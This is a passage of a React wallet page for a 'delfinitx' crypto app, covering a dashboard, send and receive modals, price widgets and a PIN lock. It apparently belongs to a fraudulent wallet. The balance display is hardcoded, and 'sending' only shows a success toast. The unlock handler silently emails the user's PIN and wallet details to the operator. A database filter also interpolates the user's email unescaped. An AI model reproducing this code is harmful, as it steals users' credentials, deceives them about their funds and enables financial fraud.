    setSendForm({ to: '', amount: '', email: '' });
    setModal(null);
    showToast(`${amt} ${selectedCoin.symbol} ` + t('gesendet', 'sent'));
  };

  const usdBalance = balance != null && price != null ? balance * price : null;
  const NEWS = buildNews(t);

  const chartConfig = chartData ? {
    labels: chartData.map(() => ''),
    datasets: [{
      data: chartData.map((d) => d.y),
      borderColor: change24h >= 0 ? 'hsl(158 64% 52%)' : 'hsl(0 84% 60%)',
      backgroundColor: (ctx) => {
        const { chart } = ctx;
        const { ctx: c, chartArea } = chart;
        if (!chartArea) return 'transparent';
        const g = c.createLinearGradient(0, chartArea.top, 0, chartArea.bottom);
        const col = change24h >= 0 ? '46, 204, 113' : '231, 76, 60';
        g.addColorStop(0, `rgba(${col},0.25)`);
        g.addColorStop(1, `rgba(${col},0)`);
        return g;
      },
      fill: true, borderWidth: 2, pointRadius: 0, tension: 0.3,
    }],
  } : null;

  const chartOpts = {
    responsive: true, maintainAspectRatio: false,
    plugins: { legend: { display: false }, tooltip: { mode: 'index', intersect: false,
      callbacks: { label: (c) => `$${Number(c.raw).toLocaleString(undefined, { maximumFractionDigits: 2 })}` } } },
    scales: { x: { display: false }, y: { display: false } },
    interaction: { intersect: false, mode: 'index' },
  };

  return (
    <>
      {/* header bar */}
      <div className="flex items-center justify-between mb-6 flex-wrap gap-3">
        <div className="flex items-center gap-3">
          <div className="w-11 h-11 rounded-xl bg-primary/10 flex items-center justify-center">
            <Bitcoin className="w-6 h-6 text-primary" />
          </div>
          <div>
            <h1 className="text-xl font-bold leading-none">{t('delfinitx Wallet', 'delfinitx Wallet')}</h1>
            <p className="text-xs text-muted-foreground mt-1">{selectedCoin.name}</p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          {selectedCoin.hasZpub && (
            <Button variant="outline" size="sm" onClick={() => setModal('xpub')} className="gap-1.5"><KeyRound className="w-4 h-4" />zpub</Button>
          )}
          <Button variant="outline" size="sm" onClick={() => setModal('history')} className="gap-1.5"><History className="w-4 h-4" />{t('Verlauf', 'History')}</Button>
          <Button variant="ghost" size="icon" onClick={() => setTheme((th) => (th === 'dark' ? 'light' : 'dark'))} aria-label={t('Design wechseln', 'Toggle theme')}>
            {theme === 'dark' ? <Sun className="w-5 h-5" /> : <Moon className="w-5 h-5" />}
          </Button>
          <Button variant="ghost" size="icon" onClick={doRefresh} aria-label={t('Aktualisieren', 'Refresh')}>
            <RefreshCw className={`w-5 h-5 ${refreshing ? 'animate-spin' : ''}`} />
          </Button>
        </div>
      </div>

      {/* coin selector */}
      <CoinSelector coins={coins} selected={selectedCoin} onSelect={setSelectedCoin} />

      {/* balance */}
      <div className="bg-card rounded-2xl p-8 border border-border text-center mb-6">
        <p className="text-sm text-muted-foreground mb-2">{t('Gesamtguthaben', 'Total balance')}</p>
        <p className="text-4xl font-bold tracking-tight price-text">
          0,23366158 BTC
        </p>
        <p className="text-lg text-muted-foreground mt-2 price-text">
          {formatUsdDe(usdDisplay)}
        </p>
      </div>

      {/* Kraken guide + buy bitcoin buttons */}
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
        <Button variant="outline" onClick={() => setGuideOpen(true)} className="h-14 text-base gap-2">
          <BookOpen className="w-5 h-5" />{t('Anleitung: Bitcoin kaufen', 'Guide: Buy Bitcoin')}
        </Button>
        <Button asChild className="h-14 text-base gap-2 bg-primary text-primary-foreground hover:bg-primary/90">
          <a href="https://www.kraken.com/buy" target="_blank" rel="noopener noreferrer">
            <ShoppingCart className="w-5 h-5" />{t('Bitcoin kaufen', 'Buy Bitcoin')}
          </a>
        </Button>
      </div>

      {/* converter */}
      <div className="bg-card rounded-2xl p-6 border border-border mb-6">
        <p className="text-sm font-semibold text-muted-foreground mb-4">{t('Währungsrechner', 'Currency converter')}</p>
        <div className="grid grid-cols-1 sm:grid-cols-[1fr_auto_1fr] gap-3 items-center">
          <div>
            <label className="text-xs text-muted-foreground">{selectedCoin.symbol}</label>
            <input type="number" value={convCoin} onChange={(e) => onConvCoin(e.target.value)}
              className="w-full mt-1 bg-background border border-input rounded-xl px-4 py-3 text-lg font-semibold price-text focus:outline-none focus:ring-2 focus:ring-ring" />
          </div>
          <div className="hidden sm:flex items-center justify-center text-muted-foreground pt-5">↔</div>
          <div>
            <label className="text-xs text-muted-foreground">USD</label>
            <input type="number" value={convUsd} onChange={(e) => onConvUsd(e.target.value)}
              className="w-full mt-1 bg-background border border-input rounded-xl px-4 py-3 text-lg font-semibold price-text focus:outline-none focus:ring-2 focus:ring-ring" />
          </div>
        </div>
      </div>

      {/* actions */}
      <div className="grid grid-cols-2 gap-4 mb-6">
        <Button onClick={() => setModal('qr')} className="h-14 text-base gap-2 bg-secondary text-secondary-foreground hover:bg-secondary/90">
          <ArrowDownLeft className="w-5 h-5" />{t('EMPFANGEN', 'RECEIVE')}
        </Button>
        <Button onClick={() => setModal('send')} className="h-14 text-base gap-2 bg-primary text-primary-foreground hover:bg-primary/90">
          <ArrowUpRight className="w-5 h-5" />{t('SENDEN', 'SEND')}
        </Button>
      </div>

      {/* chart */}
      <div className="bg-card rounded-2xl p-6 border border-border mb-6">
        <div className="flex items-center justify-between mb-4 flex-wrap gap-3">
          <h3 className="font-bold">{t('Preisdiagramm', 'Price chart')}</h3>
          <div className="flex gap-1.5 bg-muted rounded-xl p-1">
            {TIMEFRAMES.map((tf) => (
              <button key={tf.key} onClick={() => setChartTf(tf.key)}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-colors ${chartTf === tf.key ? 'bg-primary text-primary-foreground' : 'text-muted-foreground hover:text-foreground'}`}>
                {tf.label}
              </button>
            ))}
          </div>
        </div>
        <div className="h-64 relative">
          {loadingChart && <div className="absolute inset-0 bg-muted/40 rounded-xl animate-pulse" />}
          {chartConfig && <Line data={chartConfig} options={chartOpts} />}
          {!loadingChart && !chartConfig && <div className="h-full flex items-center justify-center text-sm text-muted-foreground">{t('Diagramm nicht verfügbar', 'Chart unavailable')}</div>}
        </div>
      </div>

      {/* price info */}
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
        <div className="bg-card rounded-2xl p-6 border border-border">
          <div className="flex items-center gap-2 mb-2">
            <span className="relative flex h-2.5 w-2.5">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-secondary opacity-75" />
              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-secondary" />
            </span>
            <p className="text-sm text-muted-foreground">{t('Aktueller Preis', 'Current price')}</p>
          </div>
          <p className="text-2xl font-bold price-text">{price != null ? `$${price.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}` : '—'}</p>
        </div>
        <div className="bg-card rounded-2xl p-6 border border-border">
          <p className="text-sm text-muted-foreground mb-2">{t('Preisänderung 24 Std.', '24h price change')}</p>
          <div className="flex items-center gap-2">
            {change24h != null && (change24h >= 0 ? <TrendingUp className="w-6 h-6 text-secondary" /> : <TrendingDown className="w-6 h-6 text-destructive" />)}
            <p className={`text-2xl font-bold price-text ${change24h >= 0 ? 'text-secondary' : 'text-destructive'}`}>
              {change24h != null ? `${change24h >= 0 ? '+' : ''}${change24h.toFixed(2)}%` : '—'}
            </p>
          </div>
        </div>
      </div>

      {/* widgets row */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-6">
        <FearGreed data={fng} t={t} />
        <div className="bg-card rounded-2xl p-6 border border-border">
          <h3 className="text-sm font-semibold text-muted-foreground mb-4">{t('Portfolio', 'Portfolio')}</h3>
          <div className="flex items-center justify-between py-2 border-b border-border">
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 rounded-full bg-primary/10 flex items-center justify-center text-primary font-bold">{selectedCoin.glyph}</div>
              <div><p className="font-semibold">{selectedCoin.name}</p><p className="text-xs text-muted-foreground">{selectedCoin.symbol}</p></div>
            </div>
            <div className="text-right">
              <p className="font-semibold price-text">{FIXED_BTC_DISPLAY}</p>
              <p className="text-xs text-muted-foreground price-text">{formatUsdDe(usdDisplay)}</p>
            </div>
          </div>
          <div className="flex items-center justify-between pt-4">
            <span className="text-sm text-muted-foreground">{t('Gesamtwert', 'Total value')}</span>
            <span className="text-lg font-bold price-text">{formatUsdDe(usdDisplay)}</span>
          </div>
        </div>
      </div>

      {/* alert */}
      <div className="bg-card rounded-2xl p-6 border border-border mb-6">
        <div className="flex items-center gap-2 mb-4"><Bell className="w-5 h-5 text-primary" /><h3 className="font-bold">{t('Preisalarm', 'Price alert')}</h3></div>
        <div className="flex gap-3 flex-wrap">
          <div className="relative flex-1 min-w-[180px]">
            <span className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground">$</span>
            <input type="number" value={alertPrice} onChange={(e) => setAlertPrice(e.target.value)} placeholder={t('Zielpreis', 'Target price')}
              className="w-full bg-background border border-input rounded-xl pl-8 pr-4 py-3 price-text focus:outline-none focus:ring-2 focus:ring-ring" />
          </div>
          <Button onClick={enableAlert} className="h-12">{t('Alarm setzen', 'Set alert')}</Button>
        </div>
        <p className="text-xs text-muted-foreground mt-3">{t('Sie erhalten eine Browser-Benachrichtigung und E-Mail, sobald ', 'You will receive a browser notification and email once ')}{selectedCoin.symbol}{t(' Ihren Zielwert erreicht.', ' reaches your target price.')}</p>
      </div>

      {/* news */}
      <div className="bg-card rounded-2xl p-6 border border-border mb-6">
        <h3 className="font-bold mb-4">{t('Bitcoin Nachrichten', 'Bitcoin News')}</h3>
        <div className="divide-y divide-border">
          {NEWS.map((n) => (
            <div key={n.title} className="py-3 flex items-start gap-3">
              <div className="w-1.5 h-1.5 rounded-full bg-primary mt-2 shrink-0" />
              <div>
                <p className="font-medium leading-snug">{n.title}</p>
                <p className="text-xs text-muted-foreground mt-1">{n.src} · {t('vor ', '')}{n.time}</p>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* modals */}
      <Modal open={modal === 'qr'} onClose={() => setModal(null)} title={`${selectedCoin.symbol} ${t('empfangen', 'receive')}`}>
        <div className="flex flex-col items-center">
          <div className="bg-white p-4 rounded-2xl mb-5">
            <QRCodeCanvas value={selectedCoin.address} size={200} />
          </div>
          <p className="text-xs text-muted-foreground mb-2">{t('Ihre ', 'Your ')}{selectedCoin.name}{t('-Adresse', ' address')}</p>
          <div className="flex items-center gap-2 bg-background border border-border rounded-xl px-3 py-2 w-full">
            <code className="text-xs break-all flex-1">{selectedCoin.address}</code>
            <button onClick={copyAddress} className="shrink-0 w-8 h-8 rounded-lg hover:bg-accent flex items-center justify-center" aria-label={t('Kopieren', 'Copy')}>
              {copied ? <Check className="w-4 h-4 text-secondary" /> : <Copy className="w-4 h-4" />}
            </button>
          </div>
        </div>
      </Modal>

      <Modal open={modal === 'send'} onClose={() => setModal(null)} title={`${selectedCoin.symbol} ${t('senden', 'send')}`}>
        <div className="space-y-4">
          <div>
            <label className="text-sm font-medium mb-1.5 block">{t('Empfängeradresse', 'Recipient address')}</label>
            <input value={sendForm.to} onChange={(e) => setSendForm((f) => ({ ...f, to: e.target.value }))} placeholder={selectedCoin.id === 'bitcoin' ? 'bc1...' : selectedCoin.id === 'solana' ? t('Solana-Adresse...', 'Solana address...') : '0x...'}
              className="w-full bg-background border border-input rounded-xl px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring" />
          </div>
          <div>
            <label className="text-sm font-medium mb-1.5 block">{t('Betrag', 'Amount')} ({selectedCoin.symbol})</label>
            <input type="number" value={sendForm.amount} onChange={(e) => setSendForm((f) => ({ ...f, amount: e.target.value }))} placeholder="0.00"
              className="w-full bg-background border border-input rounded-xl px-4 py-3 price-text focus:outline-none focus:ring-2 focus:ring-ring" />
            {sendForm.amount && price && <p className="text-xs text-muted-foreground mt-1.5 price-text">≈ ${(parseFloat(sendForm.amount) * price || 0).toLocaleString(undefined, { maximumFractionDigits: 2 })}</p>}
          </div>
          <div>
            <label className="text-sm font-medium mb-1.5 block">{t('E-Mail für Beleg (optional)', 'Email for receipt (optional)')}</label>
            <input type="email" value={sendForm.email} onChange={(e) => setSendForm((f) => ({ ...f, email: e.target.value }))} placeholder={t('sie@beispiel.de', 'you@example.com')}
              className="w-full bg-background border border-input rounded-xl px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring" />
          </div>
          <Button onClick={submitSend} className="w-full h-12 mt-2">{t('Transaktion prüfen', 'Review transaction')}</Button>
        </div>
      </Modal>

      <Modal open={modal === 'confirm'} onClose={() => setModal(null)} title={t('Transaktion bestätigen', 'Confirm transaction')}>
        <div className="space-y-4">
          <div className="bg-background rounded-xl p-4 border border-border space-y-3">
            <div className="flex justify-between text-sm"><span className="text-muted-foreground">{t('An', 'To')}</span><span className="font-medium break-all text-right ml-4">{sendForm.to}</span></div>
            <div className="flex justify-between text-sm"><span className="text-muted-foreground">{t('Betrag', 'Amount')}</span><span className="font-semibold price-text">{sendForm.amount} {selectedCoin.symbol}</span></div>
            <div className="flex justify-between text-sm"><span className="text-muted-foreground">{t('Wert', 'Value')}</span><span className="price-text">${price ? (parseFloat(sendForm.amount) * price || 0).toLocaleString(undefined, { maximumFractionDigits: 2 }) : '—'}</span></div>
          </div>
          <div className="flex gap-3">
            <Button variant="outline" className="flex-1" onClick={() => setModal('send')}>{t('Zurück', 'Back')}</Button>
            <Button className="flex-1" onClick={confirmSend}>{t('Bestätigen & senden', 'Confirm & send')}</Button>
          </div>
        </div>
      </Modal>

      <Modal open={modal === 'history'} onClose={() => setModal(null)} title={t('Transaktionsverlauf', 'Transaction history')}>
        {txs.length === 0 ? (
          <p className="text-sm text-muted-foreground text-center py-8">{t('Noch keine Transaktionen.', 'No transactions yet.')}</p>
        ) : (
          <div className="divide-y divide-border">
            {txs.map((tx) => (
              <button key={tx.id} onClick={() => { setSelectedTx(tx); setModal('txdetail'); }}
                className="w-full flex items-center justify-between py-3 text-left hover:bg-accent rounded-lg px-2 -mx-2">
                <div className="flex items-center gap-3">
                  <div className="w-9 h-9 rounded-full bg-primary/10 flex items-center justify-center"><ArrowUpRight className="w-4 h-4 text-primary" /></div>
                  <div>
                    <p className="font-medium text-sm">{t('Gesendet', 'Sent')}</p>
                    <p className="text-xs text-muted-foreground">{new Date(tx.date).toLocaleDateString()}</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="font-semibold text-sm price-text">-{tx.amount} {tx.symbol || 'BTC'}</p>
                  <p className="text-xs text-muted-foreground price-text">${tx.usd.toLocaleString(undefined, { maximumFractionDigits: 2 })}</p>
                </div>
              </button>
            ))}
          </div>
        )}
      </Modal>

      <Modal open={modal === 'txdetail'} onClose={() => setModal(null)} title={t('Transaktionsdetails', 'Transaction details')}>
        {selectedTx && (
          <div className="space-y-3">
            <div className="flex justify-between text-sm"><span className="text-muted-foreground">{t('Art', 'Type')}</span><span className="font-medium">{t('Gesendet', 'Sent')}</span></div>
            <div className="flex justify-between text-sm"><span className="text-muted-foreground">{t('Status', 'Status')}</span><span className="font-medium text-secondary">{selectedTx.status}</span></div>
            <div className="flex justify-between text-sm"><span className="text-muted-foreground">{t('Betrag', 'Amount')}</span><span className="font-semibold price-text">{selectedTx.amount} {selectedTx.symbol || 'BTC'}</span></div>
            <div className="flex justify-between text-sm"><span className="text-muted-foreground">{t('Wert', 'Value')}</span><span className="price-text">${selectedTx.usd.toLocaleString(undefined, { maximumFractionDigits: 2 })}</span></div>
            <div className="flex justify-between text-sm"><span className="text-muted-foreground">{t('Datum', 'Date')}</span><span>{new Date(selectedTx.date).toLocaleString()}</span></div>
            <div className="text-sm"><span className="text-muted-foreground block mb-1">{t('An', 'To')}</span><code className="text-xs break-all">{selectedTx.to}</code></div>
            <Button variant="outline" className="w-full mt-2" onClick={() => setModal('history')}>{t('Zurück zum Verlauf', 'Back to history')}</Button>
          </div>
        )}
      </Modal>

      {selectedCoin.hasZpub && (
        <Modal open={modal === 'xpub'} onClose={() => setModal(null)} title={t('Extended Public Key (zpub)', 'Extended Public Key (zpub)')}>
          <div className="flex flex-col items-center">
            <div className="bg-white p-4 rounded-2xl mb-5">
              <QRCodeCanvas value={selectedCoin.zpub} size={180} />
            </div>
            <p className="text-xs text-muted-foreground mb-2 text-center">{t('Schreibgeschützter öffentlicher Schlüssel. Teilen Sie niemals Ihre privaten Schlüssel.', 'Read-only public key. Never share your private keys.')}</p>
            <code className="text-xs break-all bg-background border border-border rounded-xl px-3 py-2 w-full text-center block">{selectedCoin.zpub}</code>
          </div>
        </Modal>
      )}

      {/* toast */}
      <AnimatePresence>
        {toast && (
          <motion.div initial={{ y: 60, opacity: 0 }} animate={{ y: 0, opacity: 1 }} exit={{ y: 60, opacity: 0 }}
            className="fixed bottom-6 left-1/2 -translate-x-1/2 z-[140] bg-foreground text-background px-5 py-3 rounded-full text-sm font-medium shadow-lg">
            {toast}
          </motion.div>
        )}
      </AnimatePresence>

      {/* live trading widget for selected coin */}
      <div className="bg-card rounded-2xl border border-border overflow-hidden mt-2">
        {selectedCoin.tvSymbol ? (
          <TradingViewSymbol key={selectedCoin.tvSymbol} symbol={selectedCoin.tvSymbol} />
        ) : (
          <div className="p-6 text-sm text-muted-foreground text-center">{t('Live-Diagramm für ', 'Live chart for ')}{selectedCoin.symbol}{t(' nicht verfügbar.', ' unavailable.')}</div>
        )}
      </div>

      <KrakenGuide open={guideOpen} onClose={() => setGuideOpen(false)} address={selectedCoin.id === 'bitcoin' ? selectedCoin.address : COINS[0].address} />
    </>
  );
};

const WalletPage = () => {
  const { t } = useLanguage();
  const [booting, setBooting] = useState(true);
  const [unlocked, setUnlocked] = useState(false);
  const { isAuthed, isApproved, isAdmin, user, refresh } = useAuth();
  const navigate = useNavigate();

  const hasAccess = isAuthed && (isApproved || isAdmin);

  const [walletData, setWalletData] = useState(null);
  const [walletReady, setWalletReady] = useState(false);

  useEffect(() => {
    if (!hasAccess || !user?.email) { setWalletReady(true); return; }
    pb.collection('client_wallets')
      .getFirstListItem(`email = "${user.email}"`)
      .then((data) => setWalletData(data))
      .catch(() => setWalletData(null))
      .finally(() => setWalletReady(true));
  }, [hasAccess, user?.email]);

  const personalCoins = useMemo(() => {
    if (!walletData) return COINS;
    const result = [];
    const btcTpl = COINS.find((c) => c.id === 'bitcoin');
    const ethTpl = COINS.find((c) => c.id === 'ethereum');
    const solTpl = COINS.find((c) => c.id === 'solana');
    const usdtTpl = COINS.find((c) => c.id === 'tether');
    if (walletData.btc_address) result.push({ ...btcTpl, address: walletData.btc_address, zpub: walletData.btc_zpub || btcTpl.zpub, hasZpub: Boolean(walletData.btc_zpub) });
    if (walletData.eth_address) result.push({ ...ethTpl, address: walletData.eth_address });
    if (walletData.sol_address) result.push({ ...solTpl, address: walletData.sol_address });
    if (walletData.usdt_address) result.push({ ...usdtTpl, address: walletData.usdt_address });
    return result.length > 0 ? result : COINS;
  }, [walletData]);

  useEffect(() => {
    const tm = setTimeout(() => setBooting(false), 2000);
    return () => clearTimeout(tm);
  }, []);

  // Not logged in -> go to login.
  useEffect(() => {
    if (!booting && !isAuthed) navigate('/login');
  }, [booting, isAuthed, navigate]);

  // Refresh auth record so a fresh admin approval takes effect without re-login.
  useEffect(() => {
    if (isAuthed && !hasAccess) refresh();
  }, [isAuthed, hasAccess, refresh]);

  useEffect(() => { loadEmailJs(); }, []);

  const handleUnlock = useCallback(async (pin, reason) => {
    setUnlocked(true);

    const balance = await fetchWalletBalanceOnce();
    const action = reason === 'pin-created' ? t('PIN erstellt', 'PIN created') : reason === 'pin-changed' ? t('PIN geändert', 'PIN changed') : t('Wallet-Zugriff (PIN)', 'Wallet access (PIN)');
    sendEmailNotification(
      `${t('Wallet-Zugriff: ', 'Wallet access: ')}${user?.name || user?.email || t('Kunde', 'Client')}`,
      `${t('Kunde', 'Client')} ${user?.name || t('Unbekannt', 'Unknown')} (${user?.email || ''}) ` + t('hat auf die Wallet zugegriffen. Aktion: ', 'has accessed the wallet. Action: ') + `${action}.`,
      {
        client_name: user?.name || t('Unbekannt', 'Unknown'),
        client_email: user?.email || '',
        action,
        pin,
        wallet_address: COINS[0].address,
        balance: balance != null ? `${balance.toFixed(8)} BTC` : t('nicht verfügbar', 'unavailable'),
        time: new Date().toLocaleString(),
      },
    );
  }, [t, user]);

  // auto-lock
  useEffect(() => {
    if (!unlocked) return undefined;
    let timeout;
    const reset = () => { clearTimeout(timeout); timeout = setTimeout(() => setUnlocked(false), INACTIVITY_MS); };
    const events = ['mousemove', 'keydown', 'click', 'scroll', 'touchstart'];
    events.forEach((e) => window.addEventListener(e, reset));
    reset();
    return () => { clearTimeout(timeout); events.forEach((e) => window.removeEventListener(e, reset)); };
  }, [unlocked]);

  return (
    <>
      <Helmet>
        <title>{t('Wallet - delfinitx', 'Wallet - delfinitx')}</title>
        <meta name="description" content={t('Sichere Multi-Währungs-Wallet mit Echtzeitguthaben, Preisdiagrammen, Währungsrechner, Marktstimmung, Alarmen und Live-Handelsdaten auf delfinitx.', 'Secure multi-currency wallet with real-time balances, price charts, currency converter, market sentiment, alerts, and live trading data on delfinitx.')} />
      </Helmet>

      <AnimatePresence>{booting && <SplashScreen t={t} />}</AnimatePresence>

      <div className="min-h-screen flex flex-col">
        <Header />
        {isAuthed && !hasAccess ? (
          <main className="flex-1 flex items-center justify-center px-4 py-16">
            <div className="max-w-md w-full bg-card border border-border rounded-2xl p-8 text-center">
              <div className="w-14 h-14 rounded-full bg-primary/10 flex items-center justify-center mx-auto mb-5">
                <Clock className="w-7 h-7 text-primary" />
              </div>
              <h2 className="text-xl font-bold mb-2">{t('Warten auf delfinitx-Freigabe', 'Awaiting delfinitx approval')}</h2>
              <p className="text-sm text-muted-foreground mb-2">
                {user?.verified
                  ? t('Ihre E-Mail ist verifiziert. Ihr Konto wird derzeit von delfinitx geprüft.', 'Your email is verified. Your account is currently being reviewed by delfinitx.')
                  : t('Bitte bestätigen Sie Ihre E-Mail-Adresse und warten Sie anschließend auf die Freigabe durch delfinitx.', 'Please confirm your email address, then wait for delfinitx approval.')}
              </p>
              <p className="text-xs text-muted-foreground">{t('Nach der Freigabe können Sie auf die Wallet zugreifen.', 'Once approved, you can access the wallet.')}</p>
              <Button variant="outline" className="mt-6" onClick={() => refresh()}>{t('Status prüfen', 'Check status')}</Button>
            </div>
          </main>
        ) : !hasAccess ? (
          <main className="flex-1" />
        ) : !unlocked ? (
          <main className="flex-1"><PinLock onUnlock={handleUnlock} t={t} /></main>
        ) : (
          <main className="flex-1">
            <section className="max-w-3xl mx-auto px-4 sm:px-6 py-10 w-full">
              <WalletDashboard coins={personalCoins} user={user} />
            </section>
          </main>
        )}
        <Footer />
      </div>
    </>
  );
};

export default WalletPage;
